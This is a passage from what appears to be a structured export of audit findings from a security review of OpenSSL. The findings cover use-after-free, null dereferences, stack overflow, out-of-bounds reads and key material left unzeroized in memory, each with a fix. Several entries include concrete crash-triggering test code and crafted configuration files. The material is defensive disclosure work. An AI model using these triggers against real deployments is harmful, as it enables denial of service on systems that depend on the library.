1 ); *p = OSSL_PARAM_construct_end(); if (EVP_KDF_CTX_set_params(kctx, params) <= 0 ) { r = 0 ; goto end; } if (EVP_KDF_CTX_set_params(kctx, params) <= 0 ) { r = 0 ; goto end; } if (EVP_KDF_derive(kctx, derived, sizeof (derived), NULL ) <= 0 ) { r = 0 ; goto end; } end : EVP_KDF_CTX_free(kctx); Figure 14.1: A test case that causes a use after free When the EVP_KDF_CTX_set_params function is called, the Scrypt implementation will try to set a digest based on the provided properties string, which is stored in ctx->propq (gure 14.2). If the properties string is invalid or the SHA-256 algorithm cannot be fetched because it is not available, then EVP_KDF_CTX_set_params returns false, and the context is freed. Freeing the context at the end of the test case in gure 14.1 will then trigger a use after free in the EVP_KDF_CTX_free function. static int set_digest (KDF_SCRYPT *ctx) { EVP_MD_free(ctx->sha256); ctx->sha256 = EVP_MD_fetch(ctx->libctx, \"sha256\" , ctx->propq ); if (ctx->sha256 == NULL ) { OPENSSL_free(ctx) ; ERR_raise(ERR_LIB_PROV, PROV_R_UNABLE_TO_LOAD_SHA256); return 0 ; } return 1 ; } Figure 14.2: The function that frees the whole context in the error case ( openssl/providers/implementations/kdfs/scrypt.c#164174 ) This bug is a use after free because before the actual context is freed, the members are freed in EVP_KDF_CTX_free (refer to scrypt:85 ). This nding was discovered through the fuzzer described in appendix D . Interestingly, the unit tests did not exercise the branch that led to the use after free, as shown in the Coveralls report . Exploit Scenario A user of OpenSSL implements a function that conditionally sets properties on the Scrypt algorithm. During testing, the use after free is not triggered because the branch that adds OSSL_KDF_PARAM_PROPERTIES is not tested. In the production system, this branch is reachable through a specic input. An attacker uses this behavior to either crash the system or cause undened behavior. Recommendations Short term, remove the call to the OPENSSL_free function from the set_digest function. Long term, deploy and run the provider fuzzer described in appendix D .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Setting OSSL_MAC_PARAM_DIGEST_NOINIT for HMAC causes segmentation fault ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Using the parameter OSSL_MAC_PARAM_DIGEST_NOINIT along with an HMAC causes a segmentation fault during HMAC initialization. The parameter is translated to the EVP_MD ag EVP_MD_CTX_FLAG_NO_INIT . This digest parameter skips certain initialization steps. Users are supposed to set a custom update function by calling the function EVP_MD_CTX_set_update_fn . However, the new provider API does not provide an API to set an update for the internal digest. The following gure presents a test case that crashes during the execution of the EVP_MAC_init function. int r = 1 ; const char *key = \"mac_key\" ; EVP_MAC_CTX *ctx = NULL ; OSSL_PARAM params[ 6 ], *p = params; EVP_MAC *evp_mac = NULL ; // ... if ((evp_mac = EVP_MAC_fetch( NULL , \"hmac\" , NULL )) == NULL ) { goto end; } int noinit = 1 ; *p++ = OSSL_PARAM_construct_int(OSSL_MAC_PARAM_DIGEST_NOINIT, &noinit); *p++ = OSSL_PARAM_construct_utf8_string( \"digest\" , \"SHA3-224\" , 9 ); *p = OSSL_PARAM_construct_end(); if ((ctx = EVP_MAC_CTX_new(evp_mac)) == NULL || ! EVP_MAC_init(ctx, ( const unsigned char *) key, strlen(key), params) ) { r = 0 ; goto end; } // ... Figure 15.1: A test case that causes a segmentation fault The segmentation fault happens when the digest calls the noninitialized update function (gure 15.2). int EVP_DigestUpdate (EVP_MD_CTX *ctx, const void *data, size_t count) { // ... if (ctx->pctx != NULL && EVP_PKEY_CTX_IS_SIGNATURE_OP(ctx->pctx) && ctx->pctx->op.sig.algctx != NULL ) { // ... if (ctx->digest == NULL || ctx->digest->prov == NULL || (ctx->flags & EVP_MD_CTX_FLAG_NO_INIT) != 0 ) goto legacy; // ... /* Code below to be removed when legacy support is dropped. */ legacy : return ctx->update(ctx, data, count); } Figure 15.2: The digest update function that calls the internal update function ( openssl/crypto/evp/digest.c#388426 ) This nding was discovered using the fuzzer described in appendix D . Recommendations Short term, add a null check for ctx->update . That way, the use of OSSL_MAC_PARAM_DIGEST_NOINIT cannot cause segmentation faults. Long term, expose an API for the new KDFs that allows functions to be called on the underlying digest. Alternatively, deprecate the OSSL_MAC_PARAM_DIGEST_NOINIT parameter type and remove it from the next OpenSSL version.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Functions of EVP_CIPHER_CTX are missing null checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Several functions that operate on an EVP_CIPHER* run into a segmentation fault if no cipher is set. None of the following functions can be called on an uninitialized context created using EVP_CIPHER_CTX_new :  EVP_CIPHER_CTX_get_key_length  EVP_CIPHER_CTX_get_nid  EVP_CIPHER_CTX_get_block_size  EVP_CIPHER_CTX_get_iv_length  EVP_CIPHER_CTX_get1_cipher  EVP_Cipher  EVP_CIPHER_param_to_asn1  EVP_CIPHER_asn1_to_param  EVP_CIPHER_get_asn1_iv  EVP_CIPHER_set_asn1_iv For example, the following code will crash: EVP_CIPHER_CTX* cipher_ctx = EVP_CIPHER_CTX_new(); if (!cipher_ctx) { return 0 ; } EVP_CIPHER_CTX_get_key_length(cipher_ctx); Figure 16.1: Example code that crashes in the second function call This is because EVP_CIPHER_CTX_get_key_length does not check whether cipher_ctx->cipher is non-null before dereferencing it. We believe null checks in these functions are worth the potential performance impact because this code is reachable through higher level APIs like EVP_RAND . The following example initializes an HMAC-DRBG that uses GMAC but does not set a cipher: unsigned char buf[ 4096 ]; int r = 1 ; EVP_RAND_CTX *ctx = NULL ; OSSL_PARAM params[ 6 ], *p = params; EVP_RAND *evp_rand = NULL ; if ((evp_rand = EVP_RAND_fetch( NULL , \"HMAC-DRBG\" , NULL )) == NULL ) { goto end; } // Missing cipher: *p++ = OSSL_PARAM_construct_utf8_string(OSSL_MAC_PARAM_CIPHER, \"AES-256-GCM\", sizeof(\"AES-256-GCM\")); *p++ = OSSL_PARAM_construct_utf8_string( \"mac\" , \"GMAC\" , 9 ); *p = OSSL_PARAM_construct_end(); if (!(ctx = EVP_RAND_CTX_new(evp_rand, NULL ))) { r = 0 ; goto end; } if (EVP_RAND_CTX_set_params(ctx, params) <= 0 ) { r = 0 ; goto end; } if (!EVP_RAND_generate(ctx, buf, sizeof (buf), 0 , 0 , NULL , 0 )) { r = 0 ; goto end; } // ... Figure 16.2: Example code that crashes because the underlying cipher is not set This nding was discovered by the fuzzer described in appendix D . Recommendations Short term, add null checks for cipher_ctx->cipher in each of the above functions. Long term, deploy the provider fuzzer described in appendix D .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Assertion could be hit when fetching algorithms by name ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "If the name in an algorithm fetch operation (i.e., the name argument to a function like EVP_MD_fetch or EVP_CIPHER_fetch ) contains a colon after the algorithm name, then an assertion is hit in the evp_method_id function. For example, the call EVP_CIPHER_fetch(NULL, \"AES256:something\", 0) aborts with the message OpenSSL internal error: Assertion failed: name_id > 0 && name_id <= METHOD_ID_NAME_MAX . This assertion is hit because of a logic bug. static void * inner_evp_generic_fetch ( /* ... */ ) { // ... if (meth_id == 0 || !ossl_method_store_cache_get(store, prov, meth_id, propq, &method)) { // ... methdata->names = name; // ... if ((method = ossl_method_construct (methdata->libctx, operation_id, &prov, 0 /* !force_cache */ , &mcm, methdata)) != NULL ) { /* * If construction did create a method for us, we know that * there is a correct name_id and meth_id , (...) */ if (name_id == 0 ) name_id = ossl_namemap_name2num (namemap, name ); meth_id = evp_method_id (name_id, operation_id); if (name_id != 0 ) ossl_method_store_cache_set(store, prov, meth_id, propq, method, up_ref_method, free_method); } // ... } // ... return method; } Figure 17.1: The invalid logic for name_id ( openssl/crypto/evp/evp_fetch.c#239349 ) The inner_evp_generic_fetch function rst constructs a method using the ossl_method_construct function. The name of the algorithm is passed through metadata->names . The ossl_method_construct function honors the colon that is used to give algorithms alternative names. Then, the algorithm name is used to get a name_id using the ossl_namemap_name2num function. This function cannot handle the colon in the name and thus returns 0 for the name_id . This means that the comment in gure 17.1 is incorrect. A successful method construction does not mean that there is a name_id for the name in this case. The next call to evp_method_id raises an assertion error because the name_id passed to the function is 0 : static uint32_t evp_method_id ( int name_id, unsigned int operation_id) { if (! ossl_assert(name_id > 0 && name_id <= METHOD_ID_NAME_MAX) || !ossl_assert(operation_id > 0 && operation_id <= METHOD_ID_OPERATION_MAX)) return 0 ; // ... } Figure 17.2: The assertion in evp_method_id ( openssl/crypto/evp/evp_fetch.c#110118 ) The OpenSSL library aborts only in debug mode, not release mode. Therefore, this is not a security issue. Still, a failed assertion indicates a bug. This nding was discovered by the provider fuzzer described in appendix D . Recommendations Short term, have the code call evp_method_id only if name_id is not 0 . That way, the fetch operation will fail gracefully. Long term, consider making ossl_namemap_name2num honor the colon, just like the method construction .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Reinitialization of EVP_MAC for GMAC fails if parameters are not provided ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Reinitialization of an EVP_MAC that uses GMAC does not completely reset its state. This means that calling the EVP_MAC_init function on a context that was previously nished using the EVP_MAC_final function does not completely reset the EVP_MAC from that context. A successive call to the EVP_MAC_update function will error out. The unit test in gure 18.2 demonstrates this behavior. The test runs the chain of initializing, updating, and nalizing the EVP_MAC twice. The second update call fails in the gcm_cipher_internal function because the IV cannot be reused (gure 18.1). static int gcm_cipher_internal (PROV_GCM_CTX *ctx, unsigned char *out, size_t *padlen, const unsigned char *in, size_t len) { // ... if (!ctx->key_set || ctx->iv_state == IV_STATE_FINISHED) goto err; // ... if (in != NULL ) { // ... } else { // ... ctx->iv_state = IV_STATE_FINISHED; /* Don't reuse the IV */ goto finish; } // ... } Figure 18.1: The internal GCM function that requires a fresh IV ( openssl/providers/implementations/ciphers/ciphercommon_gcm.c#388444 ) The IV should have been reset with the second call to EVP_MAC_init in the test. This happens when calling the EVP_MAC_CTX_set_params function before the call to EVP_MAC_init , or if the parameters are passed directly to EVP_MAC_init . This is because the cipher is (re)initialized only when the cipher, key, or IV parameters are set (refer to gmac_prov.c:215242 ). int r = 1 ; EVP_MAC_CTX *ctx = NULL ; unsigned char buf[ 4096 ]; OSSL_PARAM params[ 6 ], *p = params; size_t final_l; EVP_MAC *evp_mac = NULL ; char *key = OPENSSL_zalloc( 32 ); if ((evp_mac = EVP_MAC_fetch( NULL , \"gmac\" , NULL )) == NULL ) { goto end; } *p++ = OSSL_PARAM_construct_octet_string(OSSL_MAC_PARAM_KEY, key, 32 ); *p++ = OSSL_PARAM_construct_utf8_string(OSSL_MAC_PARAM_CIPHER, \"AES-256-GCM\" , sizeof ( \"AES-256-GCM\" )); *p = OSSL_PARAM_construct_end(); if ((ctx = EVP_MAC_CTX_new(evp_mac)) == NULL ) { r = 0 ; goto end; } if (EVP_MAC_CTX_set_params(ctx, params) <= 0 ) { r = 0 ; goto end; } if (!EVP_MAC_init(ctx, ( const unsigned char *) key, 32 , params) || !EVP_MAC_update(ctx, ( unsigned char *) text, sizeof (text)) || !EVP_MAC_final(ctx, buf, &final_l, sizeof (buf)) || ! EVP_MAC_init (ctx, ( const unsigned char *) key, 32 , NULL ) || // The following update call fails. Adding EVP_MAC_CTX_set_params(ctx, params) would fix it. ! EVP_MAC_update (ctx, ( unsigned char *) text, sizeof (text)) || !EVP_MAC_final(ctx, buf, &final_l, sizeof (buf))) { r = 0 ; goto end; } end : EVP_MAC_CTX_free(ctx); Figure 18.2: The unit test that fails for GMAC The use of an EVP_MAC like in the above unit test is common. The following gure shows an existing use in the random number generator, which contains a similar call chain. static int do_hmac (PROV_DRBG_HMAC *hmac, unsigned char inbyte, const unsigned char *in1, size_t in1len, const unsigned char *in2, size_t in2len, const unsigned char *in3, size_t in3len) { EVP_MAC_CTX *ctx = hmac->ctx; if (! EVP_MAC_init (ctx, hmac->K, hmac->blocklen, NULL ) /* K = HMAC(K, V || inbyte || [in1] || [in2] || [in3]) */ || !EVP_MAC_update(ctx, hmac->V, hmac->blocklen) || !EVP_MAC_update(ctx, &inbyte, 1 ) || !(in1 == NULL || in1len == 0 || EVP_MAC_update(ctx, in1, in1len)) || !(in2 == NULL || in2len == 0 || EVP_MAC_update(ctx, in2, in2len)) || !(in3 == NULL || in3len == 0 || EVP_MAC_update(ctx, in3, in3len)) || ! EVP_MAC_final (ctx, hmac->K, NULL , sizeof (hmac->K))) return 0 ; /* V = HMAC(K, V) */ return EVP_MAC_init (ctx, hmac->K, hmac->blocklen, NULL ) && EVP_MAC_update (ctx, hmac->V, hmac->blocklen) && EVP_MAC_final(ctx, hmac->V, NULL , sizeof (hmac->V)); } Figure 18.3: The use of an EVP_MAC in the DRBG_HMAC ( openssl/providers/implementations/rands/drbg_hmac.c#5778 ) According to the OpenSSL documentation , the IV is generated automatically for GCM: For EVP_CIPH_GCM_MODE the IV will be generated internally if it is not specied. If we use an HMAC rather than GMAC in the unit test above, the code works without resetting the parameters. This is because HMAC does not depend on an IV. Exploit Scenario A user of OpenSSL implements a function that conditionally chooses GMAC or HMAC. During testing, the error is not hit because the branch that uses GMAC is not tested. In the production system, this branch is reachable through a specic input. An attacker uses this behavior to cause an unexpected and potentially unhandled error. Recommendations Short term, have the code reset the cipher for GMAC when EVP_MAC_init is called, if that is the intended functionality. If reusing an EVP_MAC_CTX context for GMAC should not be allowed, then have the EVP_MAC_init function return an error when called with a reused GMAC. Long term, add the fuzzer for providers described in appendix D . In order to detect this issue automatically, additional API call ows must be added. In this case, the fuzzer must assert that executing an algorithm twice with the same input gives the same output.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Creation of X.509 extensions can lead to undened behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Several congurations for X.509 extension creation cause undened behavior. Depending on the platform, these congurations could cause a segmentation fault. X.509 extensions must not be confused with TLS certicate extensions here. Multiple X509V3_EXT_METHOD implementations falsely assume that key-value pairs in an X509V3 list (created through the X509V3_parse_list function) have non-null values. For example, the issuerSignTool extension expects the signTool value to be non-null (gure 19.1). static ISSUER_SIGN_TOOL * v2i_issuer_sign_tool (X509V3_EXT_METHOD *method, X509V3_CTX *ctx, STACK_OF(CONF_VALUE) *nval) { // ... for (i = 0 ; i < sk_CONF_VALUE_num(nval); ++i) { CONF_VALUE *cnf = sk_CONF_VALUE_value(nval, i); if (cnf == NULL ) { continue ; } if (strcmp(cnf->name, \"signTool\" ) == 0 ) { ist->signTool = ASN1_UTF8STRING_new(); if (ist->signTool == NULL || !ASN1_STRING_set(ist->signTool, cnf->value, strlen(cnf->value) )) { ERR_raise(ERR_LIB_X509V3, ERR_R_ASN1_LIB); goto err; } } else if (strcmp(cnf->name, \"cATool\" ) == 0 ) { // ... } else if (strcmp(cnf->name, \"signToolCert\" ) == 0 ) { // ... } else if (strcmp(cnf->name, \"cAToolCert\" ) == 0 ) { // ... } else { // ... } } // ... } Figure 19.1: The code that does not check cnf->value for null ( openssl/crypto/x509/v3_ist.c#3585 ) A segmentation fault can be triggered using the following OpenSSL command. openssl x509 -req -in request.csr -signkey key.pem -out certificate.crt -days 3650 -extensions ext -extfile openss-ext.conf Figure 19.2: An OpenSSL command that crashes The conguration le openss-ext.conf must contain a specically crafted extension conguration. The following table summarizes our ndings, by showing the congurations along with a reference to the code where the crash occurs. Conguration [ext] issuerSignTool = signTool [ext] sbgp-autonomousSysNum = AS [ext] issuingDistributionPoint = fullname [ext] sbgp-ipAddrBlock = IPv4-SAFI Reference #1 #2 #3 #4 #5 #6 #7 #8 This nding was discovered while looking for bugs similar to nding TOB-OSSL-6 . Recommendations Short term, add null checks for cnf->value , where cnf refers to a pointer returned by the sk_CONF_VALUE_value function. Long term, write a rule for a static analyzer like Semgrep or CodeQL that scans the codebase for similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Missing null checks in OSSL_PARAM getters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The getter functions for OSSL_PARAM values do not check that the data eld is not null. Therefore, the getter functions cause a segmentation fault if they are invoked for a parameter value with a null data eld. Users might accidentally construct a parameter value that points to null (gure 20.1), so this condition should be checked for. OSSL_PARAM params[ 9 ], *p = params; OSSL_PARAM res; res.key = \"n\" ; res.data_type = OSSL_PARAM_UNSIGNED_INTEGER; res.data = NULL; res.data_size = sizeof ( uint64_t ); res.return_size = OSSL_PARAM_UNMODIFIED; *p++ = res; *p = OSSL_PARAM_construct_end(); Figure 20.1: The construction of an invalid OSSL_PARAM If the above parameter is used for Scrypt, then a segmentation fault is encountered when the OSSL_PARAM_get_uint64 function is called. if ((p = OSSL_PARAM_locate_const(params, OSSL_KDF_PARAM_SCRYPT_N)) != NULL ) { if (! OSSL_PARAM_get_uint64(p, &u64_value) || u64_value <= 1 || !is_power_of_two(u64_value)) return 0 ; ctx->N = u64_value; } Figure 20.2: Scrypt gets the N parameter from the parameter array. ( openssl/providers/implementations/kdfs/scrypt.c#239246 ) The reason for the crash is that OSSL_PARAM_get_uint64 dereferences the data eld without checking whether it is null. int OSSL_PARAM_get_uint64 ( const OSSL_PARAM *p, uint64_t *val) { // ... if (p->data_type == OSSL_PARAM_UNSIGNED_INTEGER) { #ifndef OPENSSL_SMALL_FOOTPRINT switch (p->data_size) { case sizeof ( uint32_t ): *val = *( const uint32_t *)p->data; return 1 ; case sizeof ( uint64_t ): *val = *( const uint64_t *)p->data ; return 1 ; } #endif return general_get_uint(p, val, sizeof (*val)); } else if (p->data_type == OSSL_PARAM_INTEGER) { // ... } Figure 20.3: The dereference without a null check ( openssl/crypto/params.c#823894 ) The OSSL_PARAM struct is part of the public API of OpenSSL, which should aim to catch this type of mistake made by users. Recommendations Short term, add a check to all OSSL_PARAM_get_* functions to check whether the data eld is non-null. Long term, deploy the provider fuzzer described in appendix D to nd similar occurrences in the provider API.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. The ossl_blake2b_nal function fails to zeroize sensitive data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The ossl_blake2b_final function nalizes a Blake2b hash context and returns the resulting digest. If the output size is not a multiple of 8, a temporary stack buer ( outbuffer ) is used to store the digest value. This buer is not cleared, which means that the value remains on the stack. If the hash function is used as a KDF to derive key material, a copy of the resulting key would remain in memory. int ossl_blake2b_final ( unsigned char *md, BLAKE2B_CTX *c) { uint8_t outbuffer[BLAKE2B_OUTBYTES] = { 0 }; uint8_t *target = outbuffer; int iter = (c->outlen + 7 ) / 8 ; int i; /* Avoid writing to the temporary buffer if possible */ if ((c->outlen % sizeof (c->h[ 0 ])) == 0 ) target = md; // Finalize the hash function and store the result in the // buffer pointed to by target. if (target != md) memcpy(md, target, c->outlen); OPENSSL_cleanse(c, sizeof (BLAKE2B_CTX)); return 1 ; } Figure 21.1: The Blake2b context is scrubbed, but outbuffer is not zeroized before the function returns. ( providers/implementations/digests/blake2b_prov.c ) The same issue is present in the ossl_blake2s_final function. Exploit Scenario A server uses Blake2b as a KDF to derive session keys. Because of another issue in the server implementation, malicious users can send a specially crafted message to the server that causes it to leak stack memory from the application process as part of the response. This is used by an attacker to leak session keys belonging to other users, allowing the attacker to decrypt their sessions. Recommendations Short term, ensure that the stack buer outbuffer is cleared if target is dierent from md before ossl_blake2b_final and ossl_blake2s_final return. Long term, regularly review new cryptographic implementations to ensure that sensitive data is scrubbed from memory.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. The kdf_pbkdf1_do_derive function fails to zeroize sensitive data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The kdf_pbkdf1_do_derive function implements the PBKDF1 KDF. When the key is derived, the function uses the stack buer md_tmp to hold intermediate outputs from the hash function. At the end of the function, this buer holds the derived key. The md_tmp buer is never cleared before the function returns, which means that the derived key is left on the stack. static int kdf_pbkdf1_do_derive( const unsigned char *pass, size_t passlen, const unsigned char *salt, size_t saltlen, uint64_t iter, const EVP_MD *md_type, unsigned char *out, size_t n) { uint64_t i; int mdsize, ret = 0 ; unsigned char md_tmp[EVP_MAX_MD_SIZE]; EVP_MD_CTX *ctx = NULL ; // Derive the PBKDF1 key and store the result in mp_tmp. memcpy(out, md_tmp, n); ret = 1 ; err : EVP_MD_CTX_free(ctx); return ret; } Figure 22.1: The implementation of PBKDF1 leaves the derived key on the stack. ( providers/implementations/kdfs/pbkdf1.c ) Exploit Scenario A server uses PBKDF1 as the legacy fallback algorithm for hashing passwords. Because of another issue in the server implementation, malicious users can send a specially crafted message to the server that causes it to leak stack memory from the application process as part of the response. This is used by an attacker to leak password hashes belonging to other users, allowing the attacker to recover other users passwords through an oine brute-force attack. Recommendations Short term, ensure that the buer md_tmp is cleared before the kdf_pbkdf1_do_derive function returns. Long term, regularly review new cryptographic implementations to ensure that sensitive data is scrubbed from memory.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Provider conguration section can cause a stack overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Parsing a conguration containing a self-referencing string value causes the provider_conf_params function to call itself recursively and overow the stack. For example, loading the following conguration le, which references the provider_sect section within the same section, causes OpenSSL to crash with a stack overow. openssl_conf = openssl_init [openssl_init] providers = provider_sect [provider_sect] = provider_sect Figure 4.1: A conguration le that causes a stack overow The following code snippet shows the vulnerable code. If the value references the section in which the corresponding key-value pair is dened, the function will call itself recursively. The recursion depth is limited by the name buer size of 512 bytes. However, if name is empty, then up to 512 recursive calls are possible. This is because each recursive call will append only a single period character [ . ] to the name buer if name is empty. Experiments show that the stack size limit is hit quickly. static int provider_conf_params (OSSL_PROVIDER *prov, OSSL_PROVIDER_INFO *provinfo, const char *name , const char *value, const CONF *cnf) { STACK_OF(CONF_VALUE) *sect; int ok = 1 ; sect = NCONF_get_section(cnf, value); if (sect != NULL ) { int i; char buffer[ 512 ]; size_t buffer_len = 0 ; OSSL_TRACE1(CONF, \"Provider params: start section %s\\n\" , value); if (name != NULL ) { OPENSSL_strlcpy(buffer, name, sizeof (buffer)); OPENSSL_strlcat(buffer, \".\" , sizeof (buffer)); buffer_len = strlen(buffer); } for (i = 0 ; i < sk_CONF_VALUE_num(sect); i++) { CONF_VALUE *sectconf = sk_CONF_VALUE_value(sect, i); if (buffer_len + strlen(sectconf->name) >= sizeof (buffer)) return 0 ; buffer[buffer_len] = '\\0' ; OPENSSL_strlcat(buffer, sectconf->name, sizeof (buffer)); if (! provider_conf_params(prov, provinfo, buffer, sectconf->value, cnf) ) return 0 ; } OSSL_TRACE1(CONF, \"Provider params: finish section %s\\n\" , value); } else { // ... } return ok; } Figure 4.2: The provider_conf_params function can cause a stack overow. ( crypto/provider_conf.c#67111 ) Recommendations Short term, have the provider_conf_params function count the number of recursive calls that will result depending on the conguration le; impose a hard limit (e.g., 10) on the number of recursive calls allowed. Alternatively, rewrite this function to store the allocations on the heap instead of the stack and iteratively go over the conguration. Long term, use clang-tidy to detect recursive calls and verify that a recursion base case prevents the stack from overowing. Also, improve the projects fuzzing coverage by fuzzing not only the conguration parsing code but also the conguration module initialization code.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Risk of heap bu\u0000er overow during parsing of OIDs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The ASN1 conguration module reads 1 byte out of bounds when interpreting OIDs starting with a comma. The following conguration le contains an OID section that causes the parser to read out of bounds. openssl_conf = openssl_init [openssl_init] oid_secti = asdf [asdf] lt = ,comma Figure 5.1: A conguration le that causes an out-of-bounds read The out-of-bounds read happens in the do_create function. The function rst looks for the pointer p to the rst comma. Then, it decrements the pointer by 1 byte. If the input value starts with a comma, p will then point to an out-of-bounds memory region. p = strrchr(value, ',' ); if (p == NULL ) { // ... } else { // ... p--; while (ossl_isspace(*p)) { // ... } // ... } Figure 5.2: The do_create function may read 1 byte out of bounds. ( crypto/asn1/asn_moid.c#6693 ) Recommendations Short term, have the do_create function check that p will be in bounds before decrementing it. Long term, improve the projects fuzzing coverage by fuzzing not only the conguration parsing code but also the conguration module initialization code, which contains further parsing code (e.g., for OIDs).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Insu\u0000cient validation in dh_gen_common_set_params ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The dh_gen_common_set_params function is used to set or update the parameters held by a Die-Hellman (DH) key management context. (It is invoked if a user calls evp_keymgmt_set_params on a DH EVP_KEYMGMT object.) One of the settable parameters that the function accepts is the generation type, which determines how DH parameters (like primes and sub-group generators) are generated. p = OSSL_PARAM_locate_const(params, OSSL_PKEY_PARAM_FFC_TYPE); if (p != NULL ) { if (p->data_type != OSSL_PARAM_UTF8_STRING || ((gctx->gen_type = dh_gen_type_name2id_w_default(p->data, gctx->dh_type)) == -1 ) ) { ERR_raise(ERR_LIB_PROV, ERR_R_PASSED_INVALID_ARGUMENT); return 0 ; } } Figure 9.1: The gen_type eld on gctx could be updated with an invalid value ( -1 ). ( providers/implementations/keymgmt/dh_kmgmt.c ) If the parameter value is invalid, the function will return 0 , signaling an error, but will still update the generation type gctx->gen_type to -1 , which does not represent a valid parameter generation type. /* DH parameter generation types used by EVP_PKEY_CTX_set_dh_paramgen_type() */ # define DH_PARAMGEN_TYPE_GENERATOR 0 /* Use a safe prime generator */ # define DH_PARAMGEN_TYPE_FIPS_186_2 1 /* Use FIPS186-2 standard */ # define DH_PARAMGEN_TYPE_FIPS_186_4 2 /* Use FIPS186-4 standard */ # define DH_PARAMGEN_TYPE_GROUP 3 /* Use a named safe prime group */ Figure 9.2: Valid parameter generation types ( include/openssl/dh.h ) Since the value of the parameter generation type is typically not checked exhaustively, this could lead to type confusion issues or segmentation faults. if ( gctx->gen_type == DH_PARAMGEN_TYPE_GROUP && gctx->ffc_params == NULL ) { // ... } else { // ... if ((gctx->selection & OSSL_KEYMGMT_SELECT_DOMAIN_PARAMETERS) != 0 ) { if ( gctx->gen_type == DH_PARAMGEN_TYPE_GENERATOR ) // ... else ret = ossl_dh_generate_ffc_parameters(dh, gctx->gen_type, gctx->pbits, gctx->qbits, gencb); // ... } } Figure 9.3: An invalid generation type would not be detected in dh_gen during DH parameter generation. ( providers/implementations/keymgmt/dh_kmgmt.c ) Exploit Scenario An application that relies on OpenSSL for key management attempts to set the parameter generation type for a DH key exchange. This fails, but the parameter generation type is still updated. When the context is used to generate DH parameters, the wrong parameter type is generated by the library. When the application attempts to use the context to complete the key exchange, the library crashes with a segmentation fault. Recommendations Short term, have the dh_gen_common_set_params function check the return value before updating the generation type on the context. Long term, unit test error paths to ensure parameters are not updated if a call fails.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. Out-of-bounds read in kdf_pbkdf1_do_derive ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "PBKDF1 key derivation is implemented by the function kdf_pbkdf1_derive , which calls through to the kdf_pbkdf1_do_derive function to compute the actual key. Neither function validates the requested output length keylen . If keylen is greater than the digest output size, the kdf_pbkdf1_do_derive function will read out of bounds and leak uninitialized stack memory as part of the returned buer. static int kdf_pbkdf1_derive( void *vctx, unsigned char *key, size_t keylen , const ossl_param params[]) { } kdf_pbkdf1 *ctx = (kdf_pbkdf1 *)vctx; const evp_md *md; if (!ossl_prov_is_running() || !kdf_pbkdf1_set_ctx_params(ctx, params)) return 0 ; if (ctx->pass == null) { err_raise(err_lib_prov, prov_r_missing_pass); return 0 ; } if (ctx->salt == null) { err_raise(err_lib_prov, prov_r_missing_salt); return 0 ; } md = ossl_prov_digest_md(&ctx->digest); return kdf_pbkdf1_do_derive (ctx->pass, ctx->pass_len, ctx->salt, ctx->salt_len, ctx->iter, md, key, keylen ); Figure 23.1: The kdf_pbkdf1_derive function fails to validate the requested output length. ( providers/implementations/kdfs/pbkdf1.c ) static int kdf_pbkdf1_do_derive( const unsigned char *pass, size_t passlen, const unsigned char *salt, size_t saltlen, uint64_t iter, const EVP_MD *md_type , unsigned char *out, size_t n ) { uint64_t i; int mdsize, ret = 0 ; unsigned char md_tmp[EVP_MAX_MD_SIZE] ; EVP_MD_CTX *ctx = NULL ; ctx = EVP_MD_CTX_new(); if (ctx == NULL ) { ERR_raise(ERR_LIB_PROV, ERR_R_MALLOC_FAILURE); goto err; } if (!EVP_DigestInit_ex(ctx, md_type, NULL ) || !EVP_DigestUpdate(ctx, pass, passlen) || !EVP_DigestUpdate(ctx, salt, saltlen) || !EVP_DigestFinal_ex(ctx, md_tmp, NULL )) goto err; mdsize = EVP_MD_size(md_type); if (mdsize < 0 ) goto err; for (i = 1 ; i < iter; i++) { if (! EVP_DigestInit_ex(ctx, md_type, NULL ) ) goto err; if (!EVP_DigestUpdate(ctx, md_tmp, mdsize)) goto err; if (! EVP_DigestFinal_ex(ctx, md_tmp, NULL ) ) goto err; } memcpy(out, md_tmp, n); ret = 1 ; err : 